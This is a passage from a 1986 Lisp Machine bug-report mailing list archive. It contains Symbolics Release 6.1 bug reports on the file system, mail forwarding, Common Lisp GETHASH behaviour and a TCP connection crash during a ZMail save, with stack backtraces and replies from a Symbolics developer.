2715312143 :CREATION-DATE 2702057341 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>device.bin.9"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2721851396 :MODIFICATION-DATE 2715312145 :CREATION-DATE 2676324647 :AUTHOR ...) (#<LMFS-PATHNAME "B:>sys>r6>print>lgp.lisp.101"> :LENGTH-IN-BLOCKS 3 :REFERENCE-DATE 2721851402 :MODIFICATION-DATE 2715312146 :CREATION-DATE 2697640141 :AUTHOR ...) ...) ...)

(:METHOD TV:DIRECTORY-TREE :PROCESS-NEW-INFERIORS-LIST):  (P.C. = 75)
   Arg 0 (SELF): #<TREE-LIST-TOPNODE 17416500>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TV:DIRECTORY-TREE -- 9. IV's, 1. FL's 171066367>
   Arg 2 (SI:OPERATION): :PROCESS-NEW-INFERIORS-LIST
   Arg 3 (TV:DIR-LIST): ((NIL :BLOCK-SIZE 36864 :SETTABLE-PROPERTIES (:GENERATION-RETENTION-COUNT :MODIFICATION-DATE :REFERENCE-DATE :CREATION-DATE :AUTHOR :DELETED :DONT-REAP :DONT-DELETE :DONT-DELETE-REASON :AUTO-EXPUNGE-INTERVAL ...) :DISK-SPACE-DESCRIPTION "74838 free, 88892//163730 used (54%, 2 partitions)") (#<LMFS-PATHNAME "B:>LMLib>pp-6.bin.27"> :GENERATION-RETENTION-COUNT 4 :LENGTH-IN-BLOCKS 13 :REFERENCE-DATE 2723596167 :MODIFICATION-DATE 2722118318 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>LMLib>pp-6.lisp.28"> :GENERATION-RETENTION-COUNT 4 :LENGTH-IN-BLOCKS 17 :REFERENCE-DATE 2722116024 :MODIFICATION-DATE 2721873299 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>LMLib>scribble.bin.5"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2723612737 :MODIFICATION-DATE 2721734231 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>LMLib>scribble.lisp.5"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2723102346 :MODIFICATION-DATE 2721734148 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>LMLib>scribble.bin.4"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2721734107 :MODIFICATION-DATE 2721734107 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>LMLib>scribble.lisp.4"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2721734107 :MODIFICATION-DATE 2721734044 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>LMLib>scribble.bin.3"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2721733882 :MODIFICATION-DATE 2721733882 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>LMLib>scribble.lisp.3"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2721733882 :MODIFICATION-DATE 2721733774 :CREATION-DATE ...) (#<LMFS-PATHNAME "B:>LMLib>scribble.bin.2"> :GENERATION-RETENTION-COUNT 5 :LENGTH-IN-BLOCKS 1 :REFERENCE-DATE 2721733496 :MODIFICATION-DATE 2721733496 :CREATION-DATE ...) ...)

Rest of stack:
(:METHOD TV:DIRECTORY-TREE :GENERATE-INFERIORS-LIST):  (P.C. = 16)
(:METHOD TV:DIRECTORY-TREE :BEFORE :VISIBLE-INFERIORS):  (P.C. = 16)
(:METHOD TV:DIRECTORY-TREE :COMBINED :VISIBLE-INFERIORS):  (P.C. = 10)
(:METHOD TV:TREE-LIST-TOPNODE :AFTER :INIT):  (P.C. = 10)
(:METHOD TV:TREE-LIST-TOPNODE :COMBINED :INIT):  (P.C. = 20)
INSTANTIATE-FLAVOR:  (P.C. = 445)
MAKE-INSTANCE:  (P.C. = 6)
TV:FILE-SYSTEM-EDIT:  (P.C. = 22)
(:METHOD LMFS:FSMAINT-HIERED-PANE :DEMAND-TREE-EDIT):  (P.C. = 102)
(:METHOD LMFS:FSMAINT-FRAME :CASE :COMMAND-EXECUTE :TREE-EDIT-ANY):  (P.C. = 5)  (from SYS: LMFS; PATCH; LMFS-57-10)
(:METHOD LMFS:FSMAINT-FRAME :COMBINED :COMMAND-EXECUTE):  (P.C. = 565)  (from SYS: LMFS; PATCH; LMFS-57-10)
(:METHOD LMFS:FSMAINT-FRAME :INTERPRET-INPUT):  (P.C. = 150)
LMFS:FSMAINT-READ-FCN:  (P.C. = 72)
(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 105)
TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
SI:LISP-COMMAND-LOOP:  (P.C. = 67)
(:METHOD LMFS:FSMAINT-FRAME :FSMAINT-TOP-LEVEL):  (P.C. = 72)
LMFS:FSMAINT-TOP-LEVEL:  (P.C. = 6)
SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
25-Apr-86 22:07:43-EST,669;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 25 Apr 86 22:07-EST
Received: from RICKY.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 29830; Wed 23-Apr-86 22:06:06-EST
Date: Wed, 23 Apr 86 22:05 EST
From: Jonathan Taft <TAFT@MIT-MC.ARPA>
Subject: #^%@$!# unprintable words
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860423220516.2.TAFT@RICKY.AI.MIT.EDU>

In Symbolics 3640 Release 6.1 on Lisp Machine Ricky Nelson:

I tried to Meta-. the variable %%KBD-MOUSE-BUTTON and got a 
source file unavailable message, for >sys>r6>l-sys>sysdef.lisp

Apparently the whole L-SYS directory is not distributed.
 #^%@$!# unprintable words.
26-Apr-86 00:02:19-EST,1793;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 26 Apr 86 00:02-EST
Received: from AI.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 23 APR 86  18:18:58 EST
Received: from REAGAN.AI.MIT.EDU by AI.AI.MIT.EDU via Chaosnet; 23 APR 86  12:52:49 EST
Received: from MIT-MORRISON.ARPA by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 29631; Wed 23-Apr-86 12:54:03-EST
Date: Wed, 23 Apr 86 12:53 EST
From: JCMA@MIT-AI.ARPA
Subject: mail to lispm host on the internet that are not running a mailer
To: BUG-LISPM@MIT-AI.ARPA
Message-ID: <860423125346.9.JCMA@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.6, Experimental RELATUS 147.72, microcode TMC5-MIC 336,
FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

I just noticed a bunch of mail to me that has been accumulating in
MORRISON:>JCMA>MAIL.TEXT for the last six months.  this mail is coming from
people who got a qsend over the internet, tried to respond but failed, and
then either they or their send program offered to send mail.  The reply host
was morrison so they tried to send there.  Morrison, instead of forwarding to
a real mailer, just dropped the mail into mailbox in its LMFS.  While this
might be a fairly hard problem in the general (we don't know if I get my mail
around here) and it is good that the mail has not been lost all together, it
would be better if all lispm knew how to act as mail forwarders.  thus,
morrison could have asked the mailers at the local site if anybody knew who
jcma was, if any answered yes, it could have passed the mail along.  Of
course, the intended loser might have been someone else with the same userid.
Well, too bad.
28-Apr-86 09:57:55-EDT,1014;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 Apr 86 09:49-EDT
Received: from SAPSUCKER.SCRC.Symbolics.COM ([192.10.41.223]) by MIT-REAGAN.ARPA via INTERNET with SMTP id 30217; 28 Apr 86 09:49:51-EDT
Received: from FIREBIRD.SCRC.Symbolics.COM by SAPSUCKER.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 11513; Mon 28-Apr-86 09:42:55 EDT
Date: Mon, 28 Apr 86 09:41 EDT
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: Bug in Common Lisp GETHASH
To: Ken Traub <KT@XX.LCS.MIT.EDU>, bug-lispm@OZ.AI.MIT.EDU
In-Reply-To: <12201649213.28.KT@XX.LCS.MIT.EDU>
Message-ID: <860428094139.7.DCP@FIREBIRD.SCRC.Symbolics.COM>

    Date: Fri 25 Apr 86 09:20:58-EST
    From: Ken Traub <KT@XX.LCS.MIT.EDU>

    While running Release 6.1:

    According to the Common Lisp Manual, page 284, GETHASH is supposed to return
    two values, the second indicating whether or not the key was actually present.
    Symbolics' GETHASH returns only one value.

This is fixed in Release 7.

28-Apr-86 10:25:38-EDT,12233;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 Apr 86 10:09-EDT
Received: from MIT-LIVE-OAK.ARPA by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 34995; Mon 28-Apr-86 10:08:49-EDT
Received: from MIT-CHERRY.ARPA by MIT-LIVE-OAK.ARPA via CHAOS with CHAOS-MAIL id 906; Mon 28-Apr-86 10:08:25-EDT
Date: Mon, 28 Apr 86 10:08 EDT
From: Soley@MIT-MC.ARPA
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860428100826.2.SOLEY@MIT-CHERRY.ARPA>

In Symbolics 3670 Release 6.1, IP-TCP 29.13, Illustrate 4.0,
6-1-Patches 1.13, microcode TMC5-IO4-MIC 336, FEP 22, Tangleworld XIII, on Project Tanglewood Cherry:

Connection crashes in the same place every time I try to save this ZMail
buffer.

>>Error: Attempt to send a segment to broken TCP connection to NEWTOWNE-VARIETY 20, local port 1068.
While in the function TCP::BAD-TCP-CONNECTION-STATE  TCP::SEND-DATA-SEGMENT  (:METHOD TCP::TCP-OUTPUT-STREAM-MIXIN :SEND-OUTPUT-BUFFER)

TCP::BAD-TCP-CONNECTION-STATE:  (P.C. = 61)
   Arg 0 (TCP::TCB): #<TCP connection to NEWTOWNE-VARIETY 20, local port 1068 105410726>
   Arg 1 (TCP::ATTEMPT): "send a segment to"
   Local 2 (TCP::STATE): :CLOSED
   Local 3 (TCP::SUBSTATE): :RESET
   Local 4 (TCP::ERROR-TYPE): TCP::TCP-CONNECTION-RESET

TCP::SEND-DATA-SEGMENT:  (P.C. = 14)
   Arg 0 (TCP::TCB): #<TCP connection to NEWTOWNE-VARIETY 20, local port 1068 105410726>
   Arg 1 (TCP::SEG): #<TCP Segment 105414725>
   Arg 2 (TCP::PUSH-P): NIL
   --Defaulted args:--
   Arg 3 (TCP::URGENT-P): NIL

(:METHOD TCP::TCP-OUTPUT-STREAM-MIXIN :SEND-OUTPUT-BUFFER):  (P.C. = 50)
   Arg 0 (SELF): #<TCP-BINARY-STREAM 24242067>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::TCP-OUTPUT-STREAM-MIXIN -- 4. IV's, 0. FL's 1116060>
   Arg 2 (SI:OPERATION): :SEND-OUTPUT-BUFFER
   Arg 3 (TCP::SEG): #<ART-8B-1924. 105415065>
   Arg 4 (TCP::LIMIT): 534.
   Arg 5 (TCP::EXPLICIT): NIL

(:METHOD SI:BASIC-BUFFERED-OUTPUT-STREAM :SEND-CURRENT-OUTPUT-BUFFER):  (P.C. = 13)
   Arg 0 (SELF): #<TCP-BINARY-STREAM 24242067>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor SI:BASIC-BUFFERED-OUTPUT-STREAM -- 3. IV's, 0. FL's 1116052>
   Arg 2 (SI:OPERATION): :SEND-CURRENT-OUTPUT-BUFFER
   Arg 3 (SI:EXPLICIT): NIL

(:METHOD SI:BASIC-BUFFERED-OUTPUT-STREAM :SETUP-NEW-OUTPUT-BUFFER):  (P.C. = 5)
   Arg 0 (SELF): #<TCP-BINARY-STREAM 24242067>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor SI:BASIC-BUFFERED-OUTPUT-STREAM -- 3. IV's, 0. FL's 1116052>
   Arg 2 (SI:OPERATION): :SETUP-NEW-OUTPUT-BUFFER

(:METHOD SI:BUFFERED-FAST-STRING-OUT-MIXIN :GET-OUTPUT-BUFFER):  (P.C. = 12)
   Arg 0 (SELF): #<TCP-BINARY-STREAM 24242067>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor SI:BUFFERED-FAST-STRING-OUT-MIXIN -- 3. IV's, 0. FL's 1116732>
   Arg 2 (SI:OPERATION): :GET-OUTPUT-BUFFER

(:METHOD TCP::FTP-STREAM-MODE-OUTPUT-MIXIN :NEW-OUTPUT-BUFFER):  (P.C. = 4)
   Arg 0 (SELF): #<FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM "NEWT: //usr//soley//mail//ct.xmail" 24242153>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::FTP-STREAM-MODE-OUTPUT-MIXIN -- 1. IV's, 0. FL's 1145362>
   Arg 2 (SI:OPERATION): :NEW-OUTPUT-BUFFER

(:METHOD SI:BASIC-BUFFERED-OUTPUT-STREAM :SETUP-NEW-OUTPUT-BUFFER):  (P.C. = 10)
   Arg 0 (SELF): #<FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM "NEWT: //usr//soley//mail//ct.xmail" 24242153>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor SI:BASIC-BUFFERED-OUTPUT-STREAM -- 3. IV's, 0. FL's 1145367>
   Arg 2 (SI:OPERATION): :SETUP-NEW-OUTPUT-BUFFER

(:METHOD TCP::FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM :COMBINED :SETUP-NEW-OUTPUT-BUFFER):  (P.C. = 11)
   Arg 0 (SELF): #<FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM "NEWT: //usr//soley//mail//ct.xmail" 24242153>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM -- 1. IV's, 8. FL's 1146222>
   Arg 2 (SI:.OPERATION.): :SETUP-NEW-OUTPUT-BUFFER
   Rest arg (SI:.DAEMON-CALLER-ARGS.): NIL

(:METHOD SI:BASIC-BUFFERED-OUTPUT-STREAM :TYO):  (P.C. = 12)
   Arg 0 (SELF): #<FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM "NEWT: //usr//soley//mail//ct.xmail" 24242153>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor SI:BASIC-BUFFERED-OUTPUT-STREAM -- 3. IV's, 0. FL's 1145367>
   Arg 2 (SI:OPERATION): :TYO
   Arg 3 (SI:CH): 117.

(:INTERNAL (:METHOD TCP::FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM :COMBINED :TYO) 0.):  (P.C. = 11)
   Arg 0 (SELF): #<FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM "NEWT: //usr//soley//mail//ct.xmail" 24242153>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM -- 1. IV's, 8. FL's 1146222>
   Arg 2 (SI:.OPERATION.): :TYO
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (117.)

(:METHOD SI:ASCII-TRANSLATING-OUTPUT-STREAM-MIXIN :WHOPPER :TYO):  (P.C. = 31)
   Arg 0 (SELF): #<FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM "NEWT: //usr//soley//mail//ct.xmail" 24242153>
   Arg 1 (SYS:SELF-MAPPING-TABLE): SI:ASCII-TRANSLATING-OUTPUT-STREAM-MIXIN
   Arg 2 (SI:.WHOPPER-CONTINUATION.): #<DTP-COMPILED-FUNCTION (:INTERNAL (:METHOD TCP::FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM :COMBINED :TYO) 0.) 67354251>
   Arg 3 (SI:.OLD-SELF-MAPPING-TABLE.): #<Map to flavor TCP::FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM -- 1. IV's, 8. FL's 1146222>
   Arg 4 (SI:.OPERATION.): :TYO
   Arg 5 (SI:CH): 117.

(:METHOD TCP::FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM :COMBINED :TYO):  (P.C. = 13)
   Arg 0 (SELF): #<FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM "NEWT: //usr//soley//mail//ct.xmail" 24242153>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TCP::FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM -- 1. IV's, 8. FL's 1146222>
   Arg 2 (SI:.OPERATION.): :TYO
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (117.)

(:METHOD SI:OUTPUT-STREAM :DEFAULT :STRING-OUT):  (P.C. = 21)
   Arg 0 (SELF): #<FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM "NEWT: //usr//soley//mail//ct.xmail" 24242153>
   Arg 1 (SYS:SELF-MAPPING-TABLE): SI:OUTPUT-STREAM
   Arg 2 (SI:OPERATION): :STRING-OUT
   Arg 3 (STRING): "     (9) I know we can't get graphics into the browser, but there are a few places"
   Arg 4 (SI:START): 0.
   Arg 5 (SI:END): 82.

(:METHOD SI:LINE-OUTPUT-STREAM-MIXIN :LINE-OUT):  (P.C. = 13)
   Arg 0 (SELF): #<FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM "NEWT: //usr//soley//mail//ct.xmail" 24242153>
   Arg 1 (SYS:SELF-MAPPING-TABLE): SI:LINE-OUTPUT-STREAM-MIXIN
   Arg 2 (SI:OPERATION): :LINE-OUT
   Arg 3 (SI:LINE): "     (9) I know we can't get graphics into the browser, but there are a few places"
   Arg 4 (SI:START): 0.
   Arg 5 (SI:END): 82.

STREAM-COPY-UNTIL-EOF:  (P.C. = 121)
   Arg 0 (SI:FROM-STREAM): #<INTERVAL-STREAM 24242204>
   Arg 1 (SI:TO-STREAM): #<FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM "NEWT: //usr//soley//mail//ct.xmail" 24242153>
   --Defaulted args:--
   Arg 2 (SI:LEADER-SIZE): NIL

ZWEI:MSG-BUFFER-SAVE-MSG-TEXT:  (P.C. = 100)
   Arg 0 (ZWEI:BUFFER): #<BABYL-BUFFER "NEWT: //usr//soley//mail//ct.xmail" 15204622>
   Arg 1 (ZWEI:MSG): #<MSG 1606273>
   Arg 2 (ZWEI:FILE-STREAM): #<FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM "NEWT: //usr//soley//mail//ct.xmail" 24242153>
   Arg 3 (ZWEI:INTERVAL-STREAM): #<INTERVAL-STREAM 24242204>

(:METHOD ZWEI:MSG-BUFFER :SAVE-MSG-TEXT):  (P.C. = 7)
   Arg 0 (SELF): #<BABYL-BUFFER "NEWT: //usr//soley//mail//ct.xmail" 15204622>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:MSG-BUFFER -- 15. IV's, 0. FL's 120511774>
   Arg 2 (SI:OPERATION): :SAVE-MSG-TEXT
   Arg 3 (ZWEI:MSG): #<MSG 1606273>
   Arg 4 (ZWEI:FILE-STREAM): #<FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM "NEWT: //usr//soley//mail//ct.xmail" 24242153>
   Arg 5 (ZWEI:INTERVAL-STREAM): #<INTERVAL-STREAM 24242204>

(:METHOD ZWEI:BABYL-BUFFER :COMBINED :SAVE-MSG-TEXT):  (P.C. = 17)
   Arg 0 (SELF): #<BABYL-BUFFER "NEWT: //usr//soley//mail//ct.xmail" 15204622>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:BABYL-BUFFER -- 3. IV's, 6. FL's 120511737>
   Arg 2 (SI:.OPERATION.): :SAVE-MSG-TEXT
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (#<MSG 1606273> #<FTP-STREAM-MODE-CHARACTER-OUTPUT-STREAM "NEWT: //usr//soley//mail//ct.xmail" 24242153> #<INTERVAL-STREAM 24242204>)

ZWEI:SAVE-BUFFER-INTERNAL:  (P.C. = 70)
   Arg 0 (ZWEI:BUFFER): #<BABYL-BUFFER "NEWT: //usr//soley//mail//ct.xmail" 15204622>
   Arg 1 (ZWEI:FOR-FINISH): NIL

ZWEI:SAVE-MAIL-BUFFER:  (P.C. = 111)
   Arg 0 (ZWEI:BUFFER): #<BABYL-BUFFER "NEWT: //usr//soley//mail//ct.xmail" 15204622>
   --Defaulted args:--
   Arg 1 (ZWEI:FOR-FINISH): NIL

ZWEI:ZMAIL-SAVE-ALL:  (P.C. = 46)

ZWEI:COM-ZMAIL-SAVE:  (P.C. = 16)

ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
   Arg 0 (ZWEI:COMMAND): ZWEI:COM-ZMAIL-SAVE
   Arg 1 (ZWEI:CHAR): 115.
   --Defaulted args:--
   Arg 2 (ZWEI:PREFIX-CHAR): NIL
   Arg 3 (ZWEI:HOOK-LIST): NIL

ZWEI:ZMAIL-COMMAND-EXECUTE:  (P.C. = 6)
   Arg 0: ZWEI:COM-ZMAIL-SAVE

(:METHOD ZWEI:ZMAIL-FRAME :PROCESS-COMMAND-CHAR):  (P.C. = 7)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:OPERATION): :PROCESS-COMMAND-CHAR
   Arg 3 (ZWEI:CH): 115.

(:INTERNAL (:INTERNAL (:METHOD ZWEI:ZMAIL-FRAME :COMBINED :PROCESS-COMMAND-CHAR) 0.) 0.):  (P.C. = 10)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:.OPERATION.): :PROCESS-COMMAND-CHAR
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (115.)

(:METHOD ZWEI:ZMAIL-COMMAND-LOOP-MIXIN :WHOPPER :PROCESS-COMMAND-CHAR):  (P.C. = 21)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-COMMAND-LOOP-MIXIN -- 6. IV's, 0. FL's 120412165>
   Arg 2 (SI:.WHOPPER-CONTINUATION.): #<DTP-COMPILED-FUNCTION (:INTERNAL (:INTERNAL (:METHOD ZWEI:ZMAIL-FRAME :COMBINED :PROCESS-COMMAND-CHAR) 0.) 0.) 50326702>
   Arg 3 (SI:.OLD-SELF-MAPPING-TABLE.): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 4 (SI:.OPERATION.): :PROCESS-COMMAND-CHAR
   Arg 5 (ZWEI:CHAR): 115.

(:INTERNAL (:METHOD ZWEI:ZMAIL-FRAME :COMBINED :PROCESS-COMMAND-CHAR) 0.):  (P.C. = 13)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:.OPERATION.): :PROCESS-COMMAND-CHAR
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (115.)

(:METHOD ZWEI:ZMAIL-FRAME :WHOPPER :PROCESS-COMMAND-CHAR):  (P.C. = 21)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:.WHOPPER-CONTINUATION.): #<DTP-COMPILED-FUNCTION (:INTERNAL (:METHOD ZWEI:ZMAIL-FRAME :COMBINED :PROCESS-COMMAND-CHAR) 0.) 50326667>
   Arg 3 (SI:.OLD-SELF-MAPPING-TABLE.): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 4 (SI:.OPERATION.): :PROCESS-COMMAND-CHAR
   Arg 5 (ZWEI:CHAR): 115.

(:METHOD ZWEI:ZMAIL-FRAME :COMBINED :PROCESS-COMMAND-CHAR):  (P.C. = 12)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:.OPERATION.): :PROCESS-COMMAND-CHAR
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (115.)

(:METHOD ZWEI:ZMAIL-FRAME :COMMAND-LOOP):  (P.C. = 143)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:OPERATION): :COMMAND-LOOP

(:METHOD ZWEI:ZMAIL-FRAME :COMBINED :COMMAND-LOOP):  (P.C. = 70)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:.OPERATION.): :COMMAND-LOOP
   Rest arg (SI:.DAEMON-CALLER-ARGS.): NIL

ZWEI:ZMAIL-PROCESS-TOP-LEVEL:  (P.C. = 105)
   Arg 0 (ZWEI:WINDOW): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   --Defaulted args:--
   Arg 0 (IGNORE): NIL
28-Apr-86 11:02:11-EDT,718;000000000000
Received: from XX.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 Apr 86 10:24-EDT
Date: Mon 28 Apr 86 10:22:10-EDT
From: Ken Traub <KT@XX.LCS.MIT.EDU>
Subject: Another bug in Common Lisp GETHASH
To: bug-lispm@OZ.AI.MIT.EDU
Message-ID: <12202435864.55.KT@XX.LCS.MIT.EDU>

While running Release 6.1:

When trying to make an entry in an EQL hash table for a key that is a character
object, SXHASH blows out saying that the argument to %FIXNUM should be a single
precision flonum.  E.g., (setf (gethash #\A x) 3), where x is an EQL hash table.
While characters do seem to work with EQ hash tables, I'd prefer not to use one
since characters are not guaranteed to be EQ in Common Lisp.

					-- Ken
-------
28-Apr-86 12:20:27-EDT,1379;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 Apr 86 12:20-EDT
Received: from SAPSUCKER.SCRC.Symbolics.COM ([192.10.41.223]) by MIT-ZERMATT.ARPA via INTERNET with SMTP id 35018; 28 Apr 86 12:19:02-EDT
Received: from FIREBIRD.SCRC.Symbolics.COM by SAPSUCKER.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 11631; Mon 28-Apr-86 12:15:18 EDT
Date: Mon, 28 Apr 86 12:14 EDT
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
To: Soley@MIT-MC.ARPA, BUG-LISPM@MIT-ZERMATT.ARPA
In-Reply-To: <860428100826.2.SOLEY@MIT-CHERRY.ARPA>
Message-ID: <860428121408.2.DCP@FIREBIRD.SCRC.Symbolics.COM>

    Date: Mon, 28 Apr 86 10:08 EDT
    From: Soley@MIT-MC.ARPA

    In Symbolics 3670 Release 6.1, IP-TCP 29.13, Illustrate 4.0,
    6-1-Patches 1.13, microcode TMC5-IO4-MIC 336, FEP 22, Tangleworld XIII, on Project Tanglewood Cherry:

    Connection crashes in the same place every time I try to save this ZMail
    buffer.

What does (tcp::print-recent-tcp-headers) say, both on your machine and
on NEWTOWNE?  (You'll have to be pretty quick to get it on Newtowne if
it is a heavily used server.)

    >>Error: Attempt to send a segment to broken TCP connection to NEWTOWNE-VARIETY 20, local port 1068.
    While in the function TCP::BAD-TCP-CONNECTION-STATE  TCP::SEND-DATA-SEGMENT  (:METHOD TCP::TCP-OUTPUT-STREAM-MIXIN :SEND-OUTPUT-BUFFER)


28-Apr-86 12:31:55-EDT,3016;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 Apr 86 12:31-EDT
Received: from SAPSUCKER.SCRC.Symbolics.COM by MC.LCS.MIT.EDU 28 Apr 86 12:30:33 EDT
Received: from FIREBIRD.SCRC.Symbolics.COM by SAPSUCKER.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 11643; Mon 28-Apr-86 12:26:47 EDT
Date: Mon, 28 Apr 86 12:25 EDT
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: Another bug in Common Lisp GETHASH
To: Ken Traub <KT%XX@MIT-MC.ARPA>, bug-lispm%OZ@MIT-MC.ARPA
In-Reply-To: <12202435864.55.KT@XX.LCS.MIT.EDU>
Message-ID: <860428122548.0.DCP@FIREBIRD.SCRC.Symbolics.COM>

    Date: Mon 28 Apr 86 10:22:10-EDT
